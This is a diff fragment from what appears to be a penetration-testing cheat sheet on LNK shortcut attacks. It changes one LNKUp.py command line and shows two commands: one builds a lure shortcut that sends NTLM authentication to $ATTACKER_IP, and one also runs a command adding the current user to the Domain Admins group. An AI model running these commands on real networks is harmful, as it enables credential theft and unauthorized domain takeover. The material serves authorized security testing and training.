@@ -113,7 +113,7 @@ An LNK shortcut using an icon file located on a remote SMB share will be parsed 
 LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk'
 
 # SMB trap + command execution
-LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk' --execute "net group 'Domain Admins' Pentester01 /domain /add"
+LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk' --execute "net group 'Domain Admins' $USER /domain /add"
 ```
 
 ```bash
